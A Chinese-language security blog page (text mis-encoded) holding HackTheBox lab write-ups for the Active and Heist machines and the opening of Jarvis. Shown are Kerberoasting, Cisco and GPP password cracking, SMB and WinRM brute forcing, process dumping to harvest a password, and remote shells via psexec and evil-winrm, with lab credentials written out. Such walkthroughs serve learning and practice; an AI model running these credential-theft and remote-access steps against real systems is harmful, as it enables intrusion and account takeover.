<p><img src="/images/placeholder.png" alt="Âú®ËøôÈáåÊèíÂÖ•ÂõæÁâáÊèèËø∞" data-src="/images/old-machine-images/20200210212552448.png" class="lazyload"><br>ÂèëÁé∞Â∏êÂè∑ÂíåÂØÜÁ†ÅÂìàÂ∏åÂÄº</p>
<figure class="highlight awk"><table><tbody><tr><td class="code"><pre><span class="line">Â∏êÂè∑Ôºöactive.htb\SVC_TGS</span><br><span class="line">ÂìàÂ∏åÂÄºÔºöedBSHOwhZLTjt<span class="regexp">/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/</span>NglVmQ</span><br><span class="line"><span class="number">12</span></span><br></pre></td></tr></tbody></table></figure>

<p>ÂèØ‰ª•‰ΩøÁî®kaliËá™Â∏¶ÁöÑgpp-decryptÊù•Á†¥Ëß£ÂØÜÁ†Å</p>
<figure class="highlight awk"><table><tbody><tr><td class="code"><pre><span class="line">gpp-decrypt edBSHOwhZLTjt<span class="regexp">/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/</span>NglVmQ</span><br><span class="line"><span class="number">1</span></span><br></pre></td></tr></tbody></table></figure>

<p>ÂæóÂà∞ÂØÜÁ†Å <strong>GPPstillStandingStrong2k18</strong><br><img src="/images/placeholder.png" alt="Âú®ËøôÈáåÊèíÂÖ•ÂõæÁâáÊèèËø∞" data-src="/images/old-machine-images/20200210212726788.png" class="lazyload"><br>Áé∞Âú®Êàë‰ª¨Êúâ‰∫ÜÊñ∞ÁöÑÂ∏êÂè∑ Âà©Áî®SmbmapÁ°ÆËÆ§Êàë‰ª¨ÊòØÂê¶ÊúâÂÜôÁöÑÊùÉÈôêÔºàÊãøshellÔºâ</p>
<figure class="highlight nginx"><table><tbody><tr><td class="code"><pre><span class="line"><span class="attribute">smbmap</span> -H <span class="number">10.10.10.100</span> -u SVC_TGS -p GPPstillStandingStrong2k18</span><br><span class="line"><span class="number">1</span></span><br></pre></td></tr></tbody></table></figure>

<p><img src="/images/placeholder.png" alt="Âú®ËøôÈáåÊèíÂÖ•ÂõæÁâáÊèèËø∞" data-src="/images/old-machine-images/20200210213100537.png" class="lazyload"><br>ÂèëÁé∞ËÉΩËØªÊùÉÈôêËÉΩËØªÂà∞userÁõÆÂΩïÈáåÁöÑÊñá‰ª∂<br>ÂèØ‰ª•Áî®smbclient ËøõÂéªÊãøuser.txt</p>
<h1 id="‰∏âÔºåROOT"><a href="#‰∏âÔºåROOT" class="headerlink" title="‰∏âÔºåROOT"></a>‰∏âÔºåROOT</h1><p>‰πãÂâçÁúãÂà∞ Á´ØÂè£88 Êúâ kerberos Âú®ËøêË°å„ÄÇÂ∞ùËØïÂà©Áî®kerberoasing ÊîªÂáª</p>
<p><a target="_blank" rel="noopener" href="https://www.chainnews.com/articles/094369852800.htm">Kerberoasing ÊîªÂáª</a></p>
<p>Âà©Áî® impacket-GetUserSPNs</p>
<figure class="highlight awk"><table><tbody><tr><td class="code"><pre><span class="line"><span class="regexp">/usr/</span>bin<span class="regexp">/impacket-GetUserSPNs -request active.htb/</span>SVC_TGS:GPPstillStandingStrong2k18 -dc-ip <span class="number">10.10</span>.<span class="number">10.100</span> </span><br><span class="line"></span><br><span class="line"><span class="number">12</span></span><br></pre></td></tr></tbody></table></figure>

<p><img src="/images/placeholder.png" alt="Âú®ËøôÈáåÊèíÂÖ•ÂõæÁâáÊèèËø∞" data-src="/images/old-machine-images/20200210221812462.png" class="lazyload"><br>ÂæóÂà∞hashÂêé Âà©Áî®john the ripperËøõË°åÁ†¥Ëß£<br>ÂæóÂà∞ AdministratorÂØÜÁ†Å‰∏∫ Ticketmaster1968<br><img src="/images/placeholder.png" alt="Âú®ËøôÈáåÊèíÂÖ•ÂõæÁâáÊèèËø∞" data-src="/images/old-machine-images/202002102219053.png" class="lazyload"></p>
<p>ÂèñÂà∞Â∏êÂè∑ÂíåÂØÜÁ†ÅÂêé Êàë‰ª¨ÂèØ‰ª•‰ΩøÁî® impacket psexec ËøõË°åÁôªÂΩï</p>
<figure class="highlight awk"><table><tbody><tr><td class="code"><pre><span class="line"><span class="regexp">/usr/</span>share<span class="regexp">/doc/</span>python3-impacket<span class="regexp">/examples/</span>psexec.py active.htb/Administrator:Ticketmaster1968@<span class="number">10.10</span>.<span class="number">10.100</span></span><br><span class="line"><span class="number">1</span></span><br></pre></td></tr></tbody></table></figure>

<p><img src="/images/placeholder.png" alt="Âú®ËøôÈáåÊèíÂÖ•ÂõæÁâáÊèèËø∞" data-src="/images/old-machine-images/20200210222712526.png" class="lazyload"></p>
<p>ÊàêÂäü ÊãøÂà∞Administrator</p>
<br>
<br>
<br>

<p><img src="/images/placeholder.png" alt="root" data-src="/images/root.gif" class="lazyload"></p>

		  	  
	</div>



	<div class="article-categories">
	 
      <i class="iconfont icon-category" style="margin-right:4px"></i>
	  	            
				<a class="link" href="/categories/hackthebox/">hackthebox</a>           
		
      
	</div>
	

	<div class="article-tags">
		
			<i class="iconfont icon-tags" style="margin-right:4px"></i>
			            
				<a class="link" href="/tags/hackthebox/">hackthebox</a>           
			            
				<a class="link" href="/tags/smb/">smb</a>           
			
		
	</div>

	<div class="article-bottom">
		<a class="readmore" href="/2020/02/10/HTB-Active/">Continue</a> 	
	</div>	
    
</article>

	
	
	
	

<article class="article">		
	   
	<div class="article-header">
	    
		<a class="title" href="/2020/01/26/HTB-Heist/">HTB Heist Writeup</a>  
	       
		 

		<div class="meta">
			<time>Jan 26, 2020</time>			
		</div>
	</div>


	

    
	<div class="typo article-excerpt">	
		 
			<h1 id="No-4-Heist-ÈöæÂ∫¶ÁÆÄÂçï-HTB-walkthrough"><a href="#No-4-Heist-ÈöæÂ∫¶ÁÆÄÂçï-HTB-walkthrough" class="headerlink" title="No.4-Heist-ÈöæÂ∫¶ÁÆÄÂçï-HTB-walkthrough"></a>No.4-Heist-ÈöæÂ∫¶ÁÆÄÂçï-HTB-walkthrough</h1><p>ÊîªÂáªÊú∫ÔºöÂÆòÊñπKali linux 2019 64‰Ωç<br>‰ΩúËÄÖÔºö<strong>Ikonw</strong></p>
<h1 id="Èù∂Êú∫‰ªãÁªç"><a href="#Èù∂Êú∫‰ªãÁªç" class="headerlink" title="Èù∂Êú∫‰ªãÁªç"></a>Èù∂Êú∫‰ªãÁªç</h1><p><img src="/images/placeholder.png" alt="Âú®ËøôÈáåÊèíÂÖ•ÂõæÁâáÊèèËø∞" data-src="/images/old-machine-images/20200126112412354.png" class="lazyload"></p>
<h1 id="‰∏ÄÔºåÁ´ØÂè£Êâ´Êèè"><a href="#‰∏ÄÔºåÁ´ØÂè£Êâ´Êèè" class="headerlink" title="‰∏ÄÔºåÁ´ØÂè£Êâ´Êèè"></a>‰∏ÄÔºåÁ´ØÂè£Êâ´Êèè</h1><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">nmap -sV -sC heist.htb</span><br><span class="line">1</span><br><span class="line">Nmap scan report <span class="keyword">for</span> heist.htb (10.10.10.149)</span><br><span class="line">Host is up (0.25s latency).</span><br><span class="line">Not shown: 997 filtered ports</span><br><span class="line">PORT    STATE SERVICE       VERSION</span><br><span class="line">80/tcp  open  http          Microsoft IIS httpd 10.0</span><br><span class="line">| http-cookie-flags: </span><br><span class="line">|   /: </span><br><span class="line">|     PHPSESSID: </span><br><span class="line">|_      httponly flag not <span class="built_in">set</span></span><br><span class="line">| http-methods: </span><br><span class="line">|_  Potentially risky methods: TRACE</span><br><span class="line">|_http-server-header: Microsoft-IIS/10.0</span><br><span class="line">| http-title: Support Login Page</span><br><span class="line">|_Requested resource was login.php                                                                                                                                                                                                         </span><br><span class="line">135/tcp open  msrpc         Microsoft Windows RPC                                                                                                                                                                                          </span><br><span class="line">445/tcp open  microsoft-ds?                                                                                                                                                                                                                </span><br><span class="line">Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows                                                                                                                                                                                   </span><br><span class="line">                                                                                                                                                                                                                                           </span><br><span class="line">Host script results:                                                                                                                                                                                                                       </span><br><span class="line">|_clock-skew: 4s                                                                                                                                                                                                                           </span><br><span class="line">| smb2-security-mode:                                                                                                                                                                                                                      </span><br><span class="line">|   2.02:                                                                                                                                                                                                                                  </span><br><span class="line">|_    Message signing enabled but not required                                                                                                                                                                                             </span><br><span class="line">| smb2-time:                                                                                                                                                                                                                               </span><br><span class="line">|   <span class="built_in">date</span>: 2020-01-25T01:23:05                                                                                                                                                                                                              </span><br><span class="line">|_  start_date: N/A                                                                                                                                                                                                                        </span><br><span class="line">1234567891011121314151617181920212223242526</span><br></pre></td></tr></tbody></table></figure>

<h1 id="‰∫åÔºåHTTP-Enumeration"><a href="#‰∫åÔºåHTTP-Enumeration" class="headerlink" title="‰∫åÔºåHTTP Enumeration"></a>‰∫åÔºåHTTP Enumeration</h1><p>ËøõÂÖ•web, ÊòØ‰∏™ÁôªÈôÜÈ°µÈù¢„ÄÇ Âπ∂Ê≤°ÊúâÊâæÂà∞CMS, Âè≥‰∏ãËßíÊúâ‰∏™ <strong>Login as guest</strong><br><img src="/images/placeholder.png" alt="Âú®ËøôÈáåÊèíÂÖ•ÂõæÁâáÊèèËø∞" data-src="/images/old-machine-images/20200126114331293.png" class="lazyload"><br>ÂèëÁé∞ËøôÊòØ‰∏™ Á±ª‰ºº‰∫é <strong>Support desk</strong> ÁöÑÂπ≥Âè∞„ÄÇ<br><img src="/images/placeholder.png" alt="Âú®ËøôÈáåÊèíÂÖ•ÂõæÁâáÊèèËø∞" data-src="/images/old-machine-images/20200126113042235.png" class="lazyload"><br>ÁÇπÂáª Attachment Ë∑≥ËΩ¨Âà∞ config.txt</p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">version 12.2</span><br><span class="line">no service pad</span><br><span class="line">service password-encryption</span><br><span class="line">!</span><br><span class="line">isdn switch-type basic-5ess</span><br><span class="line">!</span><br><span class="line">hostname ios-1</span><br><span class="line">!</span><br><span class="line">security passwords min-length 12</span><br><span class="line"><span class="built_in">enable</span> secret 5 $1$pdQG<span class="variable">$o8nrSzsGXeaduXrjlvKc91</span></span><br><span class="line">!</span><br><span class="line">username rout3r password 7 0242114B0E143F015F5D1E161713</span><br><span class="line">username admin privilege 15 password 7 02375012182C1A1D751618034F36415408</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">ip ssh authentication-retries 5</span><br><span class="line">ip ssh version 2</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">router bgp 100</span><br><span class="line"> synchronization</span><br><span class="line"> bgp log-neighbor-changes</span><br><span class="line"> bgp dampening</span><br><span class="line"> network 192.168.0.0√Ç mask 300.255.255.0</span><br><span class="line"> timers bgp 3 9</span><br><span class="line"> redistribute connected</span><br><span class="line">!</span><br><span class="line">ip classless</span><br><span class="line">ip route 0.0.0.0 0.0.0.0 192.168.0.1</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">access-list 101 permit ip any any</span><br><span class="line">dialer-list 1 protocol ip list 101</span><br><span class="line">!</span><br><span class="line">no ip http server</span><br><span class="line">no ip http secure-server</span><br><span class="line">!</span><br><span class="line">line vty 0 4</span><br><span class="line"> session-timeout 600</span><br><span class="line"> authorization <span class="built_in">exec</span> SSH</span><br><span class="line"> transport input ssh</span><br><span class="line">1234567891011121314151617181920212223242526272829303132333435363738394041</span><br></pre></td></tr></tbody></table></figure>

<p>ÂÖ∂‰∏≠Êúâ‰∏âË°åÊòØÂåÖÂê´ÂìàÂ∏åÂÄºÁöÑ</p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line"><span class="built_in">enable</span> secret 5 $1$pdQG<span class="variable">$o8nrSzsGXeaduXrjlvKc91</span>  // Type 5 </span><br><span class="line">!</span><br><span class="line">username rout3r password 7 0242114B0E143F015F5D1E161713 //Type 7 </span><br><span class="line">username admin privilege 15 password 7 02375012182C1A1D751618034F36415408 //type 7 </span><br><span class="line">1234</span><br></pre></td></tr></tbody></table></figure>

<p>ÊåâÁÖß‰πãÂâçÊâÄËØ¥ÁöÑÔºåËøôÂ∫îËØ•ÂàÜÂà´CISCOÁöÑÂìàÂ∏åÂÄº„ÄÇ<br>ÂàÜÂà´‰∏∫ type 5 Ë∑ü type 7„ÄÇtype 5ÊòØÊúâsaltËøáÁöÑ„ÄÇ<br>Âà©Áî®ÁΩë‰∏äÁöÑÂ∑•ÂÖ∑Êù•ËøõË°åÁ†¥Ëß£„ÄÇ</p>
<p><img src="/images/placeholder.png" alt="Âú®ËøôÈáåÊèíÂÖ•ÂõæÁâáÊèèËø∞" data-src="/images/old-machine-images/20200126114855103.png" class="lazyload"><br>Type 5 ÁöÑÊØîËæÉÈ∫ªÁÉ¶ÔºåÁΩë‰∏äÁöÑÂ∑•ÂÖ∑Ê≤°ËÉΩÊâæÂà∞ÂØÜÁ†Å„ÄÇ<br>ÊâæÂà∞‰∏Ä‰∏™ <a target="_blank" rel="noopener" href="https://github.com/axcheron/cisco_pwdecrypt">githubËÑöÊú¨</a>„ÄÇ<br><img src="/images/placeholder.png" alt="Âú®ËøôÈáåÊèíÂÖ•ÂõæÁâáÊèèËø∞" data-src="/images/old-machine-images/20200126115301683.png" class="lazyload"><br>Áé∞Âú®Êàë‰ª¨Â∑≤ÁªèÊâæÂà∞ÂÖ®ÈÉ®ÁöÑË¥¶Âè∑ÂíåÂØÜÁ†Å</p>
<table>
<thead>
<tr>
<th>Ë¥¶Âè∑</th>
<th>ÂØÜÁ†Å</th>
</tr>
</thead>
<tbody><tr>
<td>admin</td>
<td>$uperP@ssword</td>
</tr>
<tr>
<td>rout3r</td>
<td>Q4)sJu\Y8qz*A3?d</td>
</tr>
<tr>
<td>Hazard</td>
<td>stealth1agent</td>
</tr>
</tbody></table>
<h1 id="‰∏âÔºåÊãøÂà∞shell"><a href="#‰∏âÔºåÊãøÂà∞shell" class="headerlink" title="‰∏âÔºåÊãøÂà∞shell"></a>‰∏âÔºåÊãøÂà∞shell</h1><p>Â∞ùËØï‰ΩøÁî®Áé∞ÊúâÁöÑË¥¶Âè∑ÂíåÂØÜÁ†Å Êù•ÁôªÈôÜÁΩëÈ°µÔºå‰ΩÜÊèêÁ§∫ÈúÄË¶ÅÁî®ÈÇÆÁÆ±„ÄÇÂà©Áî®‰∫Ü‰æãÂ≠êÂ¶Ç <strong><a href="mailto:admin@heist.htb">admin@heist.htb</a></strong><br>‰πüÊ≤°ÊúâËøõÂ±ï„ÄÇ</p>
<p>Âà©Áî®metasploit ÁöÑsmblogin Êù•ËøõË°åÁàÜÁ†¥„ÄÇ<br><img src="/images/placeholder.png" alt="Âú®ËøôÈáåÊèíÂÖ•ÂõæÁâáÊèèËø∞" data-src="/images/old-machine-images/202001261158540.png" class="lazyload"><br>ÂèëÁé∞Âè™Êúâ <strong>Hazrd:stealth1agent</strong> ÂèØ‰ª•ÁôªÈôÜ<br>ÂèëÁé∞ÊùÉÈôêÈÉΩÊòØNo AccessÂíåREAD„ÄÇ</p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">root@xing<span class="comment"># smbmap -H 10.10.10.149 -u hazard -p stealth1agent</span></span><br><span class="line">[+] Finding open SMB ports....</span><br><span class="line">[+] User SMB session establishd on 10.10.10.149...</span><br><span class="line">[+] IP: 10.10.10.149:445        Name: 10.10.10.149                                      </span><br><span class="line">        Disk                                                    Permissions</span><br><span class="line">        ----                                                    -----------</span><br><span class="line">        ADMIN$                                                  NO ACCESS</span><br><span class="line">        C$                                                      NO ACCESS</span><br><span class="line">        IPC$                                                    READ ONLY</span><br><span class="line">123456789</span><br></pre></td></tr></tbody></table></figure>

<blockquote>
<p>IPC$(Internet Process Connection)ÊòØÂÖ±‰∫´‚ÄùÂëΩÂêçÁÆ°ÈÅì‚ÄùÁöÑËµÑÊ∫êÔºåÂÆÉÊòØ‰∏∫‰∫ÜËÆ©ËøõÁ®ãÈó¥ÈÄö‰ø°ËÄåÂºÄÊîæÁöÑÂëΩÂêçÁÆ°ÈÅìÔºåÈÄöËøáÊèê‰æõÂèØ‰ø°‰ªªÁöÑÁî®Êà∑ÂêçÂíåÂè£‰ª§ÔºåËøûÊé•ÂèåÊñπÂèØ‰ª•Âª∫Á´ãÂÆâÂÖ®ÁöÑÈÄöÈÅìÂπ∂‰ª•Ê≠§ÈÄöÈÅìËøõË°åÂä†ÂØÜÊï∞ÊçÆÁöÑ‰∫§Êç¢Ôºå‰ªéËÄåÂÆûÁé∞ÂØπËøúÁ®ãËÆ°ÁÆóÊú∫ÁöÑËÆøÈóÆ„ÄÇ</p>
</blockquote>
<p>Âú®ËøôÈáåÊàë‰ª¨ÂèØ‰ª•Âà©Áî® <strong>READ ONLY</strong> ÁöÑIPC$Êù•ÂèñÂæóÊú¨Âú∞Ë¥¶Âè∑ÁöÑ‰ø°ÊÅØ„ÄÇ</p>
<p>Âà©Áî®rpclientÊù•ËøûÊé•</p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">rpcclient -U <span class="string">"Hazard%stealth1agent"</span> heist.htb</span><br><span class="line">1</span><br></pre></td></tr></tbody></table></figure>

<p><img src="/images/placeholder.png" alt="Âú®ËøôÈáåÊèíÂÖ•ÂõæÁâáÊèèËø∞" data-src="/images/old-machine-images/20200126121648687.png" class="lazyload"><br>Êàë‰ª¨‰πüÂèØ‰ª•ÂêåÊ†∑Âà©Áî®SIDÊù•Ëé∑ÂèñÁî®Êà∑Âêç<br>sidÁöÑÂêéÂõõ‰ΩçÊòØÁî®Êà∑ÁöÑÁºñÂè∑ÔºåÊàë‰ª¨ÂèØ‰ª•ÈÄöËøáÈÄêÊ∏êÂ¢ûÂä†Êù•ÊâæÂà∞Êú¨Êú∫ÁöÑÁî®Êà∑ÂêçÂ≠ó</p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">lookupsids S-1-5-21-4254423774-1266059056-3197185112-1008</span><br><span class="line">1</span><br></pre></td></tr></tbody></table></figure>

<p><img src="/images/placeholder.png" alt="Âú®ËøôÈáåÊèíÂÖ•ÂõæÁâáÊèèËø∞" data-src="/images/old-machine-images/20200126121846444.png" class="lazyload"><br>ÂèëÁé∞Â§ö‰∏â‰∏™Áî®Êà∑‰∏∫ Chase,support,Jason„ÄÇ</p>
<p>Âè¶Â§ñ‰∏Ä‰∏™ÊñπÊ≥ïÊòØÁî® <strong>impacket</strong> (Â•Ω‰∏úË•øÂëÄÔºâ„ÄÇ</p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">root@xing:/opt<span class="comment"># locate lookupsid.py</span></span><br><span class="line">/usr/share/doc/python3-impacket/examples/lookupsid.py</span><br><span class="line"></span><br><span class="line">root@xing:/opt<span class="comment"># python /usr/share/doc/python3-impacket/examples/lookupsid.py Hazard:stealth1agent@10.10.10.149</span></span><br><span class="line">Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation</span><br><span class="line"></span><br><span class="line">[*] Brute forcing SIDs at 10.10.10.149</span><br><span class="line">[*] StringBinding ncacn_np:10.10.10.149[\pipe\lsarpc]</span><br><span class="line">[*] Domain SID is: S-1-5-21-4254423774-1266059056-3197185112</span><br><span class="line">500: SUPPORTDESK\Administrator (SidTypeUser)</span><br><span class="line">501: SUPPORTDESK\Guest (SidTypeUser)</span><br><span class="line">503: SUPPORTDESK\DefaultAccount (SidTypeUser)</span><br><span class="line">504: SUPPORTDESK\WDAGUtilityAccount (SidTypeUser)</span><br><span class="line">513: SUPPORTDESK\None (SidTypeGroup)</span><br><span class="line">1008: SUPPORTDESK\Hazard (SidTypeUser)</span><br><span class="line">1009: SUPPORTDESK\support (SidTypeUser)</span><br><span class="line">1012: SUPPORTDESK\Chase (SidTypeUser)</span><br><span class="line">1013: SUPPORTDESK\Jason (SidTypeUser)</span><br><span class="line">123456789101112131415161718</span><br></pre></td></tr></tbody></table></figure>

<p>Â∞ùËØï‰∫ÜÂêÑÁßçÁªÑÂêàËøòÊòØÊó†Ê≥ïÁôªÈôÜsmbÊàñËÄÖweb„ÄÇ<br>‰∫éÊòØÂÜ≥ÂÆöÂÜçÊâ´‰∏ÄÈÅçnmap ÁúãÁúãÊúâÊ≤°Êúâ‰ªÄ‰πàÈ´òÁ´ØÂè£ÊòØÊºèÊéâÁöÑ„ÄÇ<br>ÂèëÁé∞‰∫Ü5985Á´ØÂè£ÂºÄÁùÄ</p>
<blockquote>
<p>WinRM ÊòØwindows ‰∏ÄÁßçÊñπ‰æøËøúÁ®ãÁÆ°ÁêÜÁöÑÊúçÂä°ÔºõÂºÄÂêØwinrm service,‰æø‰∫éÂú®Êó•Â∏∏Â∑•‰Ωú‰∏≠ÔºåËøúÁ®ãÁÆ°ÁêÜÊúçÂä°Âô®ÔºåÊàñÈÄöËøáËÑöÊú¨ÔºåÂêåÊó∂ÁÆ°ÁêÜÂ§öÂè∞ÊúçÂä°Âô®ÔºåÊù•ÊèêÈ´òÂ∑•‰ΩúÊïàÁéá</p>
</blockquote>
<p><img src="/images/placeholder.png" alt="Âú®ËøôÈáåÊèíÂÖ•ÂõæÁâáÊèèËø∞" data-src="/images/old-machine-images/20200126145922341.png" class="lazyload"><br>ËøôËæπÂèØ‰ª•Âà©Áî®‰∏ÄÁßçÂ∑•ÂÖ∑Âè´evil-winrm Êù•ËøõË°åÁôªÈôÜ„ÄÇ</p>
<p>ÊúâÂÖ¥Ë∂£ÁöÑÂèØ‰ª•‰∫ÜËß£Êõ¥Â§ö<br><a target="_blank" rel="noopener" href="https://www.uedbox.com/post/58739/">Evil-winRM ËøúÁ®ãÁÆ°ÁêÜshell</a></p>
<p>È¶ñÂÖàÔºåÂà©Áî®metasploit ÁöÑ <strong>scanner/winrm/winrm_login</strong> Ê®°ÂùóÊù•ÁàÜÁ†¥Â∏êÂè∑ÂíåÂØÜÁ†Å„ÄÇ<br>ÔºàËøô‰πàÂ§öÂ∏êÂè∑ÂíåÂØÜÁ†Å Âà∞Â∫ïÂì™‰∏™ÂØÜÁ†ÅÊòØÂì™‰∏™ÂëÄÔºâ„ÄÇ</p>
<p>ÊääÊñ∞ÂèñÂæóÁöÑË¥¶Âè∑ ÂÖ®ÈÉ®‰øùÂ≠òËøõ possible_user„ÄÇ<br>ÁÑ∂ÂêéÊ†πÊçÆlookupsidÂèñÂæóÁöÑ DOMAINÂ°´ÂÜô„ÄÇ</p>
<p><img src="/images/placeholder.png" alt="Âú®ËøôÈáåÊèíÂÖ•ÂõæÁâáÊèèËø∞" data-src="/images/old-machine-images/20200126150720402.png" class="lazyload"></p>
<p><img src="/images/placeholder.png" alt="Âú®ËøôÈáåÊèíÂÖ•ÂõæÁâáÊèèËø∞" data-src="/images/old-machine-images/20200126150815832.png" class="lazyload"></p>
<p>ÊàêÂäüÂèñÂæóÊúâÊïàÁôªÈôÜ</p>
<p><strong>Chase:Q4)sJu\Y8qz*A3?d</strong></p>
<p>Âà©Áî®evil-winrm ËøõË°åÁôªÈôÜ</p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">ruby evil-winrm.rb -i 10.10.10.149 -u Chase -p <span class="string">"Q4)sJu\Y8qz*A3?d"</span></span><br></pre></td></tr></tbody></table></figure>

<p><img src="/images/placeholder.png" alt="Âú®ËøôÈáåÊèíÂÖ•ÂõæÁâáÊèèËø∞" data-src="/images/old-machine-images/20200126151024557.png" class="lazyload"></p>
<h1 id="ÂõõÔºåÊèêÊùÉ"><a href="#ÂõõÔºåÊèêÊùÉ" class="headerlink" title="ÂõõÔºåÊèêÊùÉ"></a>ÂõõÔºåÊèêÊùÉ</h1><p>‰∏ÄÁï™Êé¢Á¥¢Âêé ÂèëÁé∞Êúâ <strong>firefox</strong> ÁöÑÁ®ãÂ∫èÂÜçË∑ë<br><img src="/images/placeholder.png" alt="Âú®ËøôÈáåÊèíÂÖ•ÂõæÁâáÊèèËø∞" data-src="/images/old-machine-images/2020012615214765.png" class="lazyload"><br>Âà©Áî®ÂæÆËΩØÁöÑprocdumpÊää firefoxÁöÑÊó•Âøó</p>
<p><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/sysinternals/downloads/procdump">https://docs.microsoft.com/en-us/sysinternals/downloads/procdump</a></p>
<p>Âà©Áî® evil-winrm ‰∏ä‰º† procdump.exe ÁÑ∂ÂêéÊâßË°å</p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">upload proxdump.exe</span><br><span class="line">procdump -ma 2892</span><br><span class="line">12</span><br></pre></td></tr></tbody></table></figure>

<p>ÂêéÈù¢Áî® grep ÊâæÂá∫admin ÂêéÂèëÁé∞ÂØÜÁ†Å„ÄÇ<br><img src="/images/placeholder.png" alt="Âú®ËøôÈáåÊèíÂÖ•ÂõæÁâáÊèèËø∞" data-src="/images/old-machine-images/20200126170033546.png" class="lazyload"><br>‰ΩøÁî®evil win-rm ÁôªÈôÜÂêé ÂèñÂà∞ root flag</p>
<br>
<br>
<br>

<p><img src="/images/placeholder.png" alt="root" data-src="/images/root.gif" class="lazyload"></p>

		  	  
	</div>



	<div class="article-categories">
	 
      <i class="iconfont icon-category" style="margin-right:4px"></i>
	  	            
				<a class="link" href="/categories/hackthebox/">hackthebox</a>           
		
      
	</div>
	

	<div class="article-tags">
		
			<i class="iconfont icon-tags" style="margin-right:4px"></i>
			            
				<a class="link" href="/tags/hackthebox/">hackthebox</a>           
			
		
	</div>

	<div class="article-bottom">
		<a class="readmore" href="/2020/01/26/HTB-Heist/">Continue</a> 	
	</div>	
    
</article>

	
	
	
	

<article class="article">		
	   
	<div class="article-header">
	    
		<a class="title" href="/2020/01/22/HTB-jarvis/">HTB Jarvis Writeup</a>  
	       
		 

		<div class="meta">
			<time>Jan 22, 2020</time>			
		</div>
	</div>


	

    
	<div class="typo article-excerpt">	
		 
			<blockquote>
<p>Êå∫ÊúâÊÑèÊÄùÁöÑ‰∏ÄÂè∞Êú∫Âô®ÔºåÊúâÊå∫Â§öÁßçÊñπÂºèÊãø low priv shell„ÄÇ</p>
</blockquote>
<p>ÊîªÂáªÊú∫ÔºöÂÆòÊñπKali linux 2019 64‰Ωç<br>‰ΩúËÄÖÔºö<strong>Ikonw</strong></p>
<h1 id="Èù∂Êú∫‰ªãÁªç"><a href="#Èù∂Êú∫‰ªãÁªç" class="headerlink" title="Èù∂Êú∫‰ªãÁªç"></a>Èù∂Êú∫‰ªãÁªç</h1><p><img src="/images/placeholder.png" alt="a" data-src="/images/old-machine-images/20200122113820431.png" class="lazyload"></p>
<h1 id="‰∏ÄÔºåÁ´ØÂè£Êâ´Êèè"><a href="#‰∏ÄÔºåÁ´ØÂè£Êâ´Êèè" class="headerlink" title="‰∏ÄÔºåÁ´ØÂè£Êâ´Êèè"></a>‰∏ÄÔºåÁ´ØÂè£Êâ´Êèè</h1><p>Âè™ÊúâHTTP ÊØîËæÉÊúâÂÖ¥Ë∂£Ôºåtitle ÊòØ <strong>Stark Hotel</strong></p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-22 11:48 +08</span><br><span class="line">Nmap scan report <span class="keyword">for</span> jarvis.htb (10.10.10.143)</span><br><span class="line">Host is up (0.33s latency).</span><br><span class="line">Not shown: 998 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 03:f3:4e:22:36:3e:3b:81:30:79:ed:49:67:65:16:67 (RSA)</span><br><span class="line">|   256 25:d8:08:a8:4d:6d:e8:d2:f8:43:4a:2c:20:c8:5a:f6 (ECDSA)</span><br><span class="line">|_  256 77:d4:ae:1f:b0:be:15:1f:f8:<span class="built_in">cd</span>:c8:15:3a:c3:69:e1 (ED25519)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.25 ((Debian))</span><br><span class="line">| http-cookie-flags: </span><br><span class="line">|   /: </span><br><span class="line">|     PHPSESSID: </span><br><span class="line">|_      httponly flag not <span class="built_in">set</span></span><br><span class="line">|_http-server-header: Apache/2.4.25 (Debian)</span><br><span class="line">|_http-title: Stark Hotel</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line">123456789101112131415161718</span><br></pre></td></tr></tbody></table></figure>

<h1 id="‰∫åÔºåHTTP-Enumeration"><a href="#‰∫åÔºåHTTP-Enumeration" class="headerlink" title="‰∫åÔºåHTTP Enumeration"></a>‰∫åÔºåHTTP Enumeration</h1><p>Á¨¨‰∏Ä‰∏™‰π†ÊÉØÂ∞±ÊòØÂÖàÊäägobuster ‰∏äËµ∑Êù•</p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">gobuster <span class="built_in">dir</span> -w directory-list-2.3-medium.txt -u 10.10.10.143 -t 50</span><br><span class="line">1</span><br></pre></td></tr></tbody></table></figure>

<p><img src="/images/placeholder.png" alt="a" data-src="/images/old-machine-images/20200122115946864.png" class="lazyload"><br>ÂèëÁé∞Êúâ <strong>phpmyadmin</strong><br>ÁªèËøá‰∏ÄÁï™Â∞ùËØïÔºådefault Ë¥¶Âè∑ÂíåÂØÜÁ†ÅÈÉΩÊó†Êïà„ÄÇÊöÇÊó∂ÂÖàË∑≥Ëøá„ÄÇ</p>
<p>ÁªßÁª≠ÊµèËßà stark hotel(Èí¢ÈìÅ‰æ†Áà±Â•ΩËÄÖÔºåstark Âíå jarvis)</p>
<p>Âú®ÁΩëÈ°µ‰∏äÂèëÁé∞Âá†Â§ÑÂèØÁñëÁöÑÂüüÂêç</p>
